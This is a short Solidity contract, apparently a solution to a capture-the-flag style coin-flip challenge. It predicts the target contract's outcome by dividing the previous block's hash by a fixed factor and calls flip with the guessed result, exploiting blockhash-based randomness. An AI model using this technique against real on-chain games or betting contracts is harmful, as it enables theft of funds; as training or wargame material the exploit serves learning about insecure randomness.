// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../interfaces/ICoinFlip.sol";

contract CoinFlipHack {

    ICoinFlip private coinFlip;
    uint256 private FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlip = ICoinFlip(_coinFlipAddress);
    }

    function doFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue / FACTOR;
        bool guess = flip == 1 ? true : false;
        coinFlip.flip(guess);
    }

}
